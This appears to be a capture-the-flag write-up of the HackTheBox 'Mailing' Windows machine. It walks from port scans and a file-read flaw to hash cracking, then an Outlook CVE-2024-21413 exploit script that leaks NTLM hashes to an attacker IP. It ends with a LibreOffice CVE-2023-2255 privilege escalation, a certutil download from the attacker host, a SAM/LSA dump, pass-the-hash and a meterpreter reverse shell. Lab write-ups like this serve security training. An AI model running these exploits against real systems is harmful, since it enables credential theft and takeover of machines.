```
---
title: Mailing  - HackTheBox
date: 2024-6-2 00:00:00 +/-TTTT
categories: [HackTheBox]
tags: [HackTheBox, writeup, penetration testing, CVE-2024-21413, CVE-2023-2255]     # TAG names should always be lowercase
---
```

<br />





## Scanning

**Port scanning**

```bash
┌──(root㉿kali)-[/home/kali/Desktop/mailing]
└─# nmap mailing.htb           
Starting Nmap 7.94 ( https://nmap.org ) at 2024-06-30 19:04 EDT
Stats: 0:01:38 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 22.10% done; ETC: 19:11 (0:05:45 remaining)
Nmap scan report for mailing.htb (10.10.11.14)
Host is up (0.21s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT    STATE SERVICE
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
135/tcp open  msrpc
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
465/tcp open  smtps
587/tcp open  submission
993/tcp open  imaps
```

<br /><br />

**Scan all ports**

```bash
┌──(root㉿kali)-[/home/kali/Desktop/mailing]
└─# nmap mailing.htb -p- -T5 -v
Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-01 02:42 EDT
Initiating Ping Scan at 02:42
Host is up (0.44s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
143/tcp   open  imap
445/tcp   open  microsoft-ds
465/tcp   open  smtps
587/tcp   open  submission
993/tcp   open  imaps
5040/tcp  open  unknown
5985/tcp  open  wsman
7680/tcp  open  pando-pub
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
50192/tcp open  unknown
57367/tcp open  unknown
```

<br /><br />



**Aggressive port scanning**

```bash
┌──(root㉿kali)-[/home/kali/Desktop/mailing]
└─# nmap mailing.htb -A -p25,80,110,135,139,143,445,465,587,993,5985
Starting Nmap 7.94 ( https://nmap.org ) at 2024-06-30 19:08 EDT
Nmap scan report for mailing.htb (10.10.11.14)
Host is up (0.42s latency).

PORT    STATE SERVICE       VERSION
25/tcp  open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Mailing
| http-methods: 
|_  Potentially risky methods: TRACE
110/tcp open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL TOP USER
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp open  imap          hMailServer imapd
|_imap-capabilities: IMAP4rev1 ACL NAMESPACE IMAP4 IDLE completed CAPABILITY OK RIGHTS=texkA0001 CHILDREN QUOTA SORT
445/tcp open  microsoft-ds?
465/tcp open  ssl/smtp      hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
587/tcp open  smtp          hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
993/tcp open  ssl/imap      hMailServer imapd
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: IMAP4rev1 ACL NAMESPACE IMAP4 IDLE completed CAPABILITY OK RIGHTS=texkA0001 CHILDREN QUOTA SORT
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-06-30T23:08:46
|_  start_date: N/A
|_clock-skew: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```



<br /><br /><br />

## Enumeration

**Directory bruteforce**





![](/assets/img/htb/mailing/1.2.png)

<br /><br />

**navigate to the website**

![](/assets/img/htb/mailing/1.png)



<br /><br />

**from the website we found the team members**

```bash
Ruy Alonso >> IT Team
Maya Bendito >> Support Team
Gregory Smith >> Founder and CEO
```

<br /><br />

![](/assets/img/htb/mailing/1.png)

<br /><br />

**At the end of the page there was a link to download a document called instructions.pdf**

from the instructions.pdf, i found maya's mail address

![](/assets/img/htb/mailing/2.2.png)





<br /><br />

**The request from burp**

There was not any validation or filtering on the `file` parameter, so i got LFI. 

![](/assets/img/htb/mailing/4.png)





<br /><br />

**hMailServer**

knowing that the machine was running hMailServer. I searched about its sensitive files and configuration files.

![](/assets/img/htb/mailing/2.png)



<br /><br />



I sent a request to `C:\Program Files\hMailServer\Bin\hMailServer.ini`. but the response was 404 not found. so I tried to send a request to `C:\Program Files (x86)\hMaihMailServer\Bin\hMailServer.ini`



<br />![](/assets/img/htb/mailing/3.png)



<br /><br />

**I got the content of the file. and there was the administrator hash.**

<br />

![](/assets/img/htb/mailing/5.png)





<br /><br />

**From [crackstation](https://crackstation.net/), I cracked the hash**

![](/assets/img/htb/mailing/6.png)





<br /><br />

## Exploitation

**CVE-2024-21413**

Microsoft Outlook has the capability of displaying emails in HTML (Hypertext Markup Language) format. HTML is the standard markup language used to create webpages. By using HTML, Outlook users can receive and view emails that are visually appealing and contain complex styling, similar to what we see in web pages. This HTML formatting enables Outlook to recognize and handle hyperlinks.

By using the “file://“ moniker link in our hyperlink, we can instruct Outlook to attempt to access a file, such as a file on the network share in our case. When Outlook attempts to access the file through the hyperlink, it uses the SMB protocol. During this process, the victim machine automatically attempts to authenticate to the attacker machine using NTLMv2 authentication. This whole process is stopped by the “Protected View” mentioned earlier. The vulnerability here exists by modifying our hyperlink to include a “!” special character and some text in our Moniker link, which results in us bypassing the outlook protected view. For example:

```
<a href="file:///\\\\10.10.111.111\\test\\test.rtf!something">CLICK ME</a>
```

This will result in the attacker capturing the NTLMv2 hash (which contains the user credentials) on its attacker machine. RCE (Remote Code Execution) is also possible.

<small>source: https://medium.com/@moromerx/cve-2024-21413-8a93f6a9acfa</small>



<br /><br />

**Exploit CVE-2024-21413**

From [CVE-2024-21413](https://github.com/CMNatic/CVE-2024-21413), I changed the sender email, receiver email
sender email = 'administrator@mailing.htb' 
receiver email = 'maya@mailing.htb' 

```python
<p><a href="file://myIP/test!exploit">Click me</a></p>
.
.
.
server = smtplib.SMTP('10.10.11.14', 25) #machine ip
```

<br /><br />

**The exploit**

```python
'''
Author: CMNatic | https://github.com/cmnatic
Version: 1.1 | 13/03/2024
Only run this on systems that you own or are explicitly authorised to test (in writing). Unauthorised scanning, testing or exploitation is illegal.
'''

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'administrator@mailing.htb' 
receiver_email = 'maya@mailing.htb' 
password = input("Enter your attacker email password: ")
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://10.10.16.83/test!exploit">Click me</a></p>

    </body>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

# Convert the HTML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('10.10.11.14', 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\nEmail delivered")
except Exception as error:
    print(error)
finally:
    server.quit()

```



<br /><br />

**I startd responder to capture the NTLM hash of maya.**

```bash
┌──(root㉿kali)-[/home/kali/Desktop/mailing]
└─# responder -I tun0
```

<br /><br />

**Executed the exploit**

```bash
┌──(root㉿kali)-[/home/kali/Desktop/mailing]
└─# python3 poc.py
```



<br /><br />

**I got the NTLMv2 hash of maya**

![](/assets/img/htb/mailing/7.png)

<br />

```bash
SMB] NTLMv2-SSP Client   : 10.10.11.14
[SMB] NTLMv2-SSP Username : MAILING\maya
[SMB] NTLMv2-SSP Hash     : maya::MAILING:6ee1de458280a64a:3F098908C83E17B28395A19DFDA4C939:010100000000000000DA57C542CBDA013ED9A11E7AACC6750000000002000800570038003900540001001E00570049004E002D004D0054004D0056005000450032004B005A004D00420004003400570049004E002D004D0054004D0056005000450032004B005A004D0042002E0057003800390054002E004C004F00430041004C000300140057003800390054002E004C004F00430041004C000500140057003800390054002E004C004F00430041004C000700080000DA57C542CBDA0106000400020000000800300030000000000000000000000000200000B6B1BE499B5D55E5343A1D3DAE0B58464A68CC7E8F621A470B82090422B8E5EC0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00380033000000000000000000  
```



<br /><br />

**Cracked the hash with hashcat**

```bash
┌──(root㉿kali)-[/home/kali/Desktop/mailing]
└─# hashcat -a 0 -m 5600 ntlm.txt /usr/share/wordlists/rockyou.txt  
```

<br />

![](/assets/img/htb/mailing/8.png)

<br /><br />

**I logged in with evil-winrm**

<br />

![](/assets/img/htb/mailing/9.png)

<br /><br /><br />

## Privilege escalation

**Enumerate the machine groups**

![](/assets/img/htb/mailing/12.png)

<br />

**After enumeration the softwares, programes, I found that libreoffice version is 7.4. and this version has CVE-2023-2255**



![](/assets/img/htb/mailing/10.png)



<br /><br />

**Exploit CVE-2023-2255**

From [CVE-2023-2255](https://github.com/elweth-sec/CVE-2023-2255), I configured the command to add maya to the administrators group

```bash
┌──(root㉿kali)-[/home/kali/Desktop/mailing]
└─# python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt'
```

<br />

![](/assets/img/htb/mailing/11.png)

<br /><br />

**I Transfered the exploit to the machine and excuted it **

```cmd
*Evil-WinRM* PS C:\Important Documents> certutil -urlcache -f http://10.10.16.83:8000/exploit.odt exploit.odt
****  Online  ****
CertUtil: -URLCache command completed successfully.
*Evil-WinRM* PS C:\Important Documents> dir


    Directory: C:\Important Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          7/1/2024   6:51 AM          30526 exploit.odt


*Evil-WinRM* PS C:\Important Documents> ./exploit.odt

```

<br /><br />

**Now, maya is in the administrators group**

![](/assets/img/htb/mailing/15.png)





<br /><br />

**I used secretsdump to dump the SAM file**

![](/assets/img/htb/mailing/16.png)

<br />

```bash
┌──(root㉿kali)-[/home/kali/Desktop/mailing]
└─# python3 secretsdump.py MAILING/maya:m******@10.10.11.14
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xe48032e07c396415754917a5cddd064e
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e349e2966c623fcb0a254e866a9a7e4c:::
localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::
maya:1002:aad3b435b51404eeaad3b435b51404ee:af760798079bf7a3d80253126d3d28af:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DefaultPassword 
MAILING\maya:m********
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6ae066e13000e96db530290957d2eb4c29bf3d91
dpapi_userkey:0xc55f2e678125be838218463f73bc5f8442dc0ea2
[*] NL$KM 
 0000   BB 60 EA 5A 21 D6 F6 68  92 C6 BF 06 E2 48 29 68   .`.Z!..h.....H)h
 0010   40 7B C7 0D 39 75 D5 B5  E9 3F 81 35 45 EA 99 F9   @{..9u...?.5E...
 0020   FB 4D 90 27 AD F6 11 E4  EC 18 3D 40 FE 31 CC 65   .M.'......=@.1.e
 0030   22 0D DF 53 16 A1 06 9C  91 90 05 BF 03 D5 6F 36   "..S..........o6
NL$KM:bb60ea5a21d6f66892c6bf06e2482968407bc70d3975d5b5e93f813545ea99f9fb4d9027adf611e4ec183d40fe31cc65220ddf5316a1069c919005bf03d56f36
[-] NTDSHashes.__init__() got an unexpected keyword argument 'skipUser'
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

<br /><br />



**Logged in with the localadmin account and got the root flag**

```bash
┌──(root㉿kali)-[/home/kali/Desktop/mailing]
└─# localadmin@10.10.11.14 -hashes "aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae"
```

<br />

![](/assets/img/htb/mailing/17.png)



<br /><br />

**Another quicker method to get the root flag**

If you just need to get root flag without dumping the SAM file and loggining with the localadmin account you can modify the exploit to copy the root flag to the temp directory and get the flag.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/mailing]
└─# python3 CVE-2023-2255.py --cmd 'C:\Windows\System32\cmd.exe /c TYPE C:\Users\localadmin\Desktop\root.txt > C:\Temp\root.txt' --output 'getrootflag.odt'
```

<br />

![](/assets/img/htb/mailing/13.png)

<br />



![](/assets/img/htb/mailing/14.png)



<br /><br />

**Also you can use metasploit `windows/smb/psexec` to login with SYSTEM**

you can skip the privilege escalation part and let metasploit to do it for you.

```bash
msf6 exploit(windows/smb/psexec) > options 
sf6 exploit(windows/smb/psexec) > setg  rhosts 10.10.11.14
rhosts => 10.10.11.14
msf6 exploit(windows/smb/psexec) > set SMBDomain MAILING
SMBDomain => MAILING
msf6 exploit(windows/smb/psexec) > set SMBUser maya
SMBUser => maya
msf6 exploit(windows/smb/psexec) > set SMBPass m*********
SMBPass => m*********
msf6 exploit(windows/smb/psexec) > set payload payload/windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > run 
```

<br />

![](/assets/img/htb/mailing/18.png)
